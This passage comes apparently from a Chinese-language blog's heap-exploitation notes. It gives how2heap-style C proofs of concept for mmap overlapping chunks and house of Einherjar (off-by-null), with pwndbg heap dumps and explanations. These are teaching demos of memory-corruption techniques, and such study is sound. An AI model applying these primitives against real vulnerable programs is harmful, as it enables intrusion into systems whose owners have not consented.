+<h3 id="mmap-overlapping-chunks"><a href="#mmap-overlapping-chunks" class="headerlink" title="mmap_overlapping_chunks"></a>mmap_overlapping_chunks</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;assert.h&gt;
+
+int main()&#123;
+
+	int* ptr1 &#x3D; malloc(0x10); 
+
+	long long* top_ptr &#x3D; malloc(0x100000);
+	long long* mmap_chunk_2 &#x3D; malloc(0x100000);
+	long long* mmap_chunk_3 &#x3D; malloc(0x100000);
+    
+	mmap_chunk_3[-1] &#x3D; (0xFFFFFFFFFD &amp; mmap_chunk_3[-1]) + (0xFFFFFFFFFD &amp; mmap_chunk_2[-1]) | 2;
+    
+	free(mmap_chunk_3); 
+
+	long long* overlapping_chunk &#x3D; malloc(0x300000);
+    
+	int distance &#x3D; mmap_chunk_2 - overlapping_chunk;
+	overlapping_chunk[distance] &#x3D; 0x1122334455667788;
+
+	assert(mmap_chunk_2[0] &#x3D;&#x3D; overlapping_chunk[distance]);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>同<code>2.23</code></p>
+<h3 id="house-of-einherjar-off-by-null-1"><a href="#house-of-einherjar-off-by-null-1" class="headerlink" title="house_of_einherjar(off-by-null)"></a>house_of_einherjar(off-by-null)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;malloc.h&gt;
+#include &lt;assert.h&gt;
+
+int main()
+&#123;
+	setbuf(stdin, NULL);
+	setbuf(stdout, NULL);
+
+	uint8_t* a;
+	uint8_t* b;
+	uint8_t* d;
+
+	a &#x3D; (uint8_t*) malloc(0x38);
+	int real_a_size &#x3D; malloc_usable_size(a);
+
+	size_t fake_chunk[6];
+
+	fake_chunk[0] &#x3D; 0x100;
+	fake_chunk[1] &#x3D; 0x100;
+	fake_chunk[2] &#x3D; (size_t) fake_chunk; 
+	fake_chunk[3] &#x3D; (size_t) fake_chunk; 
+	fake_chunk[4] &#x3D; (size_t) fake_chunk; 
+	fake_chunk[5] &#x3D; (size_t) fake_chunk; 
+
+	b &#x3D; (uint8_t*) malloc(0x4f8);
+	int real_b_size &#x3D; malloc_usable_size(b);
+	uint64_t* b_size_ptr &#x3D; (uint64_t*)(b - 8);
+    
+	a[real_a_size] &#x3D; 0; 
+	size_t fake_size &#x3D; (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
+	*(size_t*)&amp;a[real_a_size-sizeof(size_t)] &#x3D; fake_size;
+
+	fake_chunk[1] &#x3D; fake_size;
+
+	free(b);
+	d &#x3D; malloc(0x200);
+
+	assert((long)d &#x3D;&#x3D; (long)&amp;fake_chunk[2]);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>先创建两个堆和一个伪造的堆,第一个堆的大小要是<code>0x?8</code>用来溢出到下一个堆的<code>size</code>位实现<code>off-by-null</code></p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
+Allocated chunk | PREV_INUSE
+Addr: 0x405000
+Size: 0x251
+
+Allocated chunk | PREV_INUSE
+Addr: 0x405250
+Size: 0x41
+
+Allocated chunk | PREV_INUSE
+Addr: 0x405290
+Size: 0x501
+
+Top chunk | PREV_INUSE
+Addr: 0x405790
+Size: 0x20871<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7fffffffdd10
+0x7fffffffdd10:	0x0000000000000100	0x0000000000000100		#prve_size    size
+0x7fffffffdd20:	0x00007fffffffdd10	0x00007fffffffdd10		#fd           bk
+0x7fffffffdd30:	0x00007fffffffdd10	0x00007fffffffdd10		#fd_nextsize  bknextsize<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>改第二个堆的<code>inuse</code>为<code>0</code>,即表示上一个堆已经释放，再伪造<code>fake_chunk</code>的大小和第二个堆的<code>size</code>,绕过<code>prve_size == fd-&gt;size</code>的检查</p>
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
+Allocated chunk | PREV_INUSE
+Addr: 0x405000
+Size: 0x251
+
+Allocated chunk | PREV_INUSE
+Addr: 0x405250
+Size: 0x41
+
+Allocated chunk
+Addr: 0x405290
+Size: 0x500
+
+Top chunk | PREV_INUSE
+Addr: 0x405790
+Size: 0x20871
+
+pwndbg&gt; x&#x2F;20gx 0x405290
+0x405290:	0xffff800000407580	0x0000000000000500
+0x4052a0:	0x0000000000000000	0x0000000000000000
+0x4052b0:	0x0000000000000000	0x0000000000000000
+0x4052c0:	0x0000000000000000	0x0000000000000000
+0x4052d0:	0x0000000000000000	0x0000000000000000
+0x4052e0:	0x0000000000000000	0x0000000000000000
+0x4052f0:	0x0000000000000000	0x0000000000000000
+0x405300:	0x0000000000000000	0x0000000000000000
+0x405310:	0x0000000000000000	0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7fffffffdd10
+0x7fffffffdd10:	0x0000000000000100	0xffff800000407580
+0x7fffffffdd20:	0x00007fffffffdd10	0x00007fffffffdd10
+0x7fffffffdd30:	0x00007fffffffdd10	0x00007fffffffdd10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>释放掉之后<code>fake_chunk</code>会和第二个堆合并，再次申请即可得到<code>fake_chunk</code>的地址</p>
 
                 
             </div>
